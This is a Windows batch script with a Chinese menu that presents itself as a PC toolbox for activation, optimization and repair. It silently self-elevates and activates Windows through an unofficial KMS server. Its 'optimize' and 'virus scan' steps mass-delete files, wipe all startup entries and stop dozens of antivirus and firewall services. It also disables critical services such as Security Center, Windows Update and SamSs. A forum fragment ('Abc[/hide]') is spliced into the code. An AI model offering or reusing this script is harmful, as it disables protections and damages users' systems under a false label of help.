@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
exit /B
:gotAdmin
if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
color 7c
:zhu
cls
echo -----------------------------------------
echo.
echo a:ZDYT网站 b:激活WIN10  c:优化系统 d:修复系统
echo.
echo e:退出程序
echo -----------------------------------------
set /p a=请输入上面的选项:
if /i %a%==a goto a
if /i %a%==b goto b
if /i %a%==c goto c
if /i %a%==d goto d
if /i %a%==e goto e
echo 你的输入有误，按任意键返回主程序
pause >>nul
goto zhu
:a
start explorer https://zdyt.github.io/sh.html
goto zhu
:b
slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX
slmgr /skms kms.03k.org
slmgr /ato
slmgr.vbs -xpr
goto zhu
:c
echo 您好我是优化软件，先为您查询今日日期和现在的时间。

ping 127.0.0.1 /n 2 >nul

echo %date:~0,4%年%date:~5,2%月%date:~8,2%日%time:~0,8%

pause

ping 127.0.0.1 /n 2 >nul

echo 我是专门优化电脑的，可以为您优化电脑

echo. 

echo 此工具可以帮您系统提速！ 

echo. & pause 

echo 第一步,Windows BAT正在清理C盘的系统垃圾和临时文件，请稍后…… 

del /f /s /q %systemdrive%\*.tmp 

del /f /s /q %systemdrive%\*._mp 

del /f /s /q %systemdrive%\*.log 

del /f /s /q %systemdrive%\*.gid 

del /f /s /q %systemdrive%\*.chk 

del /f /s /q %systemdrive%\*.old 

del /f /s /q %systemdrive%\recycled\*.* 

del /f /s /q %windir%\*.bak 

del /f /s /q %windir%\prefetch\*.* 

rd /s /q %windir%\temp & md %windir%\temp 

del /f /q %userprofile%\COOKIES s\*.* 

del /f /q %userprofile%\recent\*.* 

del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*" 

del /f /s /q "%userprofile%\Local Settings\Temp\*.*" 

del /f /s /q "C:\WINDOWS\HELP\*.*" 

del /f /s /q "%userprofile%\recent\*.*" 

echo 完成√，下一步将会使用磁盘清理实用程序清理其他盘的垃圾文件。 

echo. & pause 

cleanmgr 

echo 第二步：清理开机启动项，加快系统开机速度！ 

echo. & pause 

reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /va /f 

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /va /f 

reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v ctfmon.exe /d C:\WINDOWS\system32\ctfmon.exe 

reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg" /f 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v command /d ""C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE" /Spoil /RemAdvDef /Migration32" 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v hkey /d HKLM 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v inimapping /d 0 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v item /d IMJPMIG

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v command /d "C:\WINDOWS\system32\IME\TINTLGNT\TINTSETP.EXE /IMEName" 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v hkey /d HKLM 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v inimapping /d 0 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v item /d TINTSETP 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v command /d ""C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE" /Spoil /RemAdvDef /Migration32" 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v hkey /d HKLM 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v inimapping /d 0 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v item /d TINTSETP 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run 

del "C:\Documents and Settings\All Users\「开始」菜单\程序\启动\*.*" /q /f 

del "C:\Documents and Settings\Default User\「开始」菜单\程序\启动\*.*" /q /f 

del "%userprofile%\「开始」菜单\程序\启动\*.*" /q /f 

echo 第三步：使用“添加或删除程序”来卸载不需要的软件，提高系统运行速度。（需要手动删除） 

echo. & pause 

appwiz.cpl 

echo 第四步：更多性能优化，请：在“我的电脑”点右键，按“属性”，高级选项卡页，在性能部分的设置打开 点击调整为最佳性能，即可。（需要手动设置） 

echo. & pause 

echo 第五步：快速查毒杀毒，不损伤系统！

echo. & pause 

del c:\winnt\logo1_.exe 

del c:\windows\logo1_.exe 

del c:\winnt\0sy.exe 

del c:\windows\0sy.exe 

del c:\winnt\1sy.exe 

del c:\windows\1sy.exe 

del c:\winnt\2sy.exe 

del c:\windows\2sy.exe 

del c:\winnt\3sy.exe 

del c:\windows\3sy.exe 

del c:\winnt\4sy.exe 

del c:\windows\4sy.exe 

del c:\winnt\5sy.exe 

del c:\windows\5sy.exe 

del c:\winnt\6sy.exe 

del c:\windows\6sy.exe 

del c:\winnt\7sy.exe 

del c:\windows\7sy.exe 

del c:\winnt\8sy.exe 

del c:\windows\8sy.exe 

del c:\winnt\9sy.exe 

del c:\windows\9sy.exe 

del c:\winnt\rundl132.exe 

del c:\windows\rundl132.exe 

net share c$ /d 

net share d$ /d 

net share e$ /d 

net share F$ /d 

net share G$ /d 

net share h$ /d 

net share i$ /d 

net share j$ /d 

net share admin$ /d 

net share ipc$ /d 

del c:\winnt\logo1_.exe 

del c:\windows\logo1_.exe 

del c:\windows\vdll.dll 

del c:\winnt\vdll.dll 

del c:\windows\tdll.dll 

del c:\winnt\tdll.dll 

del c:\windows\dll.dll 

del c:\winnt\dll.dll 

del c:\winnt\kill.exe 

del c:\windows\kill.exe 

del c:\winnt\sws32.dll 

del c:\windows\sws32.dll 

del c:\winnt\rundl132.exe 

del c:\windows\rundl132.exe 

echo. 

echo. 

echo. 

echo. ***************************** 

echo. 

echo. 正在查毒...请不要关闭...... 

echo. 

echo. ***************************** 

echo. 

echo. 

echo. 

echo. 

ping 127.0.0.1 -n 5 

del c:\winnt\logo1_.exe 

del c:\windows\logo1_.exe 

del C:\winnt\system32\Logo1_.exe 

del C:\winnt\system32\rundl132.exe 

del C:\winnt\system32\bootconf.exe 

del C:\winnt\system32\kill.exe 

del C:\winnt\system32\sws32.dll 

del C:\windows\Logo1_.exe 

del C:\windows\rundl132.exe 

del C:\windows\bootconf.exe 

del C:\windows\kill.exe 

del C:\windows\sws32.dll 

del C:\windows\dll.dll 

del C:\windows\vdll.dll 

del c:\windows\tdll.dll 

del C:\windows\system32\ShellExt\svchs0t.exe 

del C:\windows\system32\Logo1_.exe 

del C:\windows\system32\rundl132.exe 

del C:\windows\system32\bootconf.exe 

del C:\windows\system32\kill.exe 

del C:\windows\system32\sws32.dll 

del c:\_desktop.ini /f/s/q/a 

del d:\_desktop.ini /f/s/q/a 

del e:\_desktop.ini /f/s/q/a 

del f:\_desktop.ini /f/s/q/a 

del g:\_desktop.ini /f/s/q/a 

del h:\_desktop.ini /f/s/q/a 

del i:\_desktop.ini /f/s/q/a 

del j:\_desktop.ini /f/s/q/a 

del k:\_desktop.ini /f/s/q/aAbc[/hide]

net stop "McAfee.com VirusScan Online Realtime Engine"

net stop "McAfee Agent"

net stop " McAfee SecurityCenter Update Manager "

net stop "McShield"

net stop "SyGateService"

net stop "Sygate Personal Firewall Pro"

net stop "Sygate Personal Firewall"

net stop "Sophos Anti-Virus"

net stop "Sophos Anti-Virus Network"

net stop "eTrust Antivirus Job Server"

net stop "eTrust Antivirus Realtime Server"

net stop "eTrust Antivirus RPC Server"

net stop "ViRobot Expert Monitoring"

net stop "ViRobot Lite Monitoring"

net stop "Quick Heal Online Protection"

net stop "V3MonNT"

net stop "V3MonSvc"

net stop "Security Center"

net stop "Windows Firewall"

net stop "Windows Internet Connection Sharing(ICS)"

net stop "NAV Alert"

net stop "NAV Auto-Protect"

net stop "ScriptBlocking Service"

net stop "DefWatch"

net stop "Background Intelligent Transfer Service"

net stop "System Event Notification"

net stop "BlackICE"

net stop "AVSync Manager"

net stop "AVG7 Alert Manager Server"

net stop "AVG7 Update Service"

net stop "InVircible Scheduler"

net stop "kavsvc"

net stop "avast! Antivirus"

net stop "avast! iAVS4 Control Service"

net stop "Trend ServerProtect Agent"

net stop "Trend ServerProtect "

echo 查毒杀毒完毕

pause

echo 第六步：优化系统服务。

pause

sc config Alerter start= DISABLED

sc config ALG start= DISABLED

sc config AppMgmt start= DEMAND

sc config AudioSrv start= AUTO

sc config BITS start= DISABLED

sc config Browser start= DISABLED

sc config ClipSrv start= DISABLED

sc config COMSysApp start= DEMAND

sc config CryptSvc start= DEMAND

sc config DcomLaunch start= AUTO

sc config Dhcp start= AUTO

sc config dmadmin start= DEMAND

sc config dmserver start= DEMAND

sc config Dnscache start= DISABLED

sc config Eventlog start= AUTO

sc config EventSystem start= DEMAND

sc config FastUserSwitchingCompatibility start= DISABLED

sc config HidServ start= DISABLED

sc config HTTPFilter start= DEMAND

sc config ImapiService start= DISABLED

sc config lanmanserver start= DISABLED

sc config lanmanworkstation start= DISABLED

sc config LmHosts start= DISABLED

sc config Messenger start= DISABLED

sc config mnmsrvc start= DISABLED

sc config MSDTC start= DISABLED

sc config MSIServer start= DEMAND

sc config NetDDE start= DISABLED

sc config NetDDEdsdm start= DISABLED

sc config Netlogon start= DISABLED

sc config Netman start= DEMAND

sc config Nla start= DISABLED

sc config NtLmSsp start= DEMAND

sc config PlugPlay start= AUTO

sc config PolicyAgent start= DISABLED

sc config ProtectedStorage start= AUTO

sc config RasAuto start= DISABLED

sc config RasMan start= DEMAND

sc config RDSessMgr start= DISABLED

sc config RemoteAccess start= DISABLED

sc config RemoteRegistry start= DISABLED

sc config RpcLocator start= DISABLED

sc config RpcSs start= AUTO

sc config RSVP start= DISABLED

sc config SamSs start= DISABLED

sc config SCardSvr start= DEMAND

sc config Schedule start= DISABLED

sc config seclogon start= DISABLED

sc config SENS start= DISABLED

sc config SharedAccess start= DISABLED

sc config ShellHWDetection start= DISABLED

sc config Spooler start= AUTO

sc config srservice start= DISABLED

sc config SSDPSRV start= DISABLED

sc config stisvc start= DEMAND

sc config SwPrv start= DISABLED

sc config SysmonLog start= DISABLED

sc config TapiSrv start= DEMAND

sc config TermService start= DISABLED

sc config Themes start= AUTO

sc config TlntSvr start= DISABLED

sc config TrkWks start= DISABLED

sc config UMWdf start= DEMAND

sc config WMPNetworkSvc start= DISABLED

sc config upnphost start= DISABLED

sc config VSS start= DISABLED

sc config W32Time start= DISABLED

sc config WebClient start= DISABLED

sc config winmgmt start= AUTO

sc config WmdmPmSN start= DISABLED

sc config Wmi start= DEMAND

sc config WmiApSrv start= DISABLED

sc config wscsvc start= DISABLED

sc config wuauserv start= DISABLED

sc config WZCSVC start= DEMAND

sc config xmlprov start= DEMAND

sc config helpsvc start= DISABLED

sc config CiSvc start= DISABLED

sc config ERSvc start= DISABLED

sc config NtmsSvc start= DEMAND

sc config NVSvc start= DEMAND
:d
DISM /Online /Cleanup-image /RestoreHealth
:e
exit
